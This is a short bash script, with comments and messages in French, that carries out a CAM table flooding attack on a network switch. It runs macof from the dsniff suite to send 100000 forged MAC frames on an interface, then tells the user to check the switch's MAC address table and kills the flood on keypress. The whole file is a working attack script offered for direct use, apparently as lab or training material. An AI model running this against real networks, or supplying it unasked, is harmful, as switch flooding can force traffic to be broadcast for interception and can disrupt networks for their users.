#!/bin/bash

echo "=== CAM Flooding Attack ==="
echo "Objectif: Deborder la table CAM du switch"

INTERFACE="eth0"

echo "Activation du flooding MAC..."
echo "Utilisation de macof (dsniff)..."

macof -i $INTERFACE -n 100000 &

echo "Attaque en cours..."
echo "Verifier la table CAM du switch: show mac address-table"
echo "Appuyer sur Entree pour arreter..."
read

killall macof 2>/dev/null
echo "CAM Flooding arrete."
